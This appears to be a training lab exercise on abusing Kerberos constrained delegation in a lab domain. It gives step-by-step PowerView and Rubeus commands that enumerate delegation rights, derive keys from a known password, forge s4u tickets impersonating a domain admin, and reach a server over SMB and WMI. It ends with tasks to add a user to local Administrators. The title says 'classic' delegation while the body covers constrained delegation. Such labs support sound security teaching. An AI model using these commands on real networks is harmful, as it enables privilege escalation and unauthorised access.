# Exercise 4 - Kerberos Classic Delegation

## Tools

You can find all tools needed in the ["attacker-tools.zip"-file](../exercises/attacker-tools). The links below are for your own reference.

Tools needed:

- PowerView: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- Rubeus: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

## Exercise

In this exercise, we'll abuse the constrained delegation permission of the user "taskservice" to get access to adsec-01. 

Open powershell with admin rights (right-click "Run as Administrator") and load rubeus/powerview.

```
cd C:\attacker-tools
cat -raw .\PowerView.ps1 | iex
cat -raw .\Invoke-Rubeus.ps1 | iex
```

Find users that are enabled for constrained delegation.

```
Get-DomainUser -TrustedToAuth
```

Show the allowed delegation targets.

```
Get-DomainUser -TrustedToAuth | select -ExpandProperty msds-allowedtodelegateto
```

Luckily, we know the password of user taskservice. First, we generate the AES keys, which we need in the next steps.

```
Invoke-Rubeus -Command "hash /password:Amsterdam2015 /domain:contoso.com /user:taskservice"
```

Rubeus allows us to start powershell in a new logon session. This implies that the tickets we forge only exist in this logon session and do not interfere with the already existing kerboers tickets of user john. 

```
Invoke-Rubeus -Command "createnetonly /program:C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe /show"
```

Remember, execute the commands below in the powershell you just started with rubeus!

```
cd C:\attacker-tools
cat -raw .\Invoke-Rubeus.ps1 | iex
```

First, we use s4u to request a TGS impersonating the domain admin user "Bruce Willis" (bwillis) against adsec-01. We request 3 tickets for 3 different services. "CIFS" will be used for SMB access and "HOST"/"RPCSS" are needed for WMI.

```
Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:cifs/adsec-01.contoso.com /ptt"
Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:host/adsec-01.contoso.com /ptt"
Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:rpcss/adsec-01.contoso.com /ptt"
```

Have a look at the kerberos tickets you just created by running klist.

```
klist
```

Let's see if that worked. Try to access the server through SMB.

```
ls \\adsec-01.contoso.com\C$
```

Now try to access the server through WMI. Note: the command below queries the WMI class win32_process, which basically means: list all running processes. This is similar to running "ps" in a terminal.

```
Get-WmiObject -Class win32_process -ComputerName adsec-01.contoso.com
```


# Questions
- In the exercise above, you acquired read access on the server adsec-01 through SMB and WMI. Now try to get code execution through these two protocols. The goal is to execute the following command, which will add the user john to the local admin group:
    - "net localgroup Administrators john /ADD"
- Demonstrate a way to achieve this with SMB as well as with WMI. `Hint:` we already used a tool for remote management that relies on SMB in the PTH exercise and Powershell contains a native command for invoking WMI methods.
- Try to impersonate the domain admin user "Chuck Norris" instead of "Bruce Willis". Does it work? Explain why.
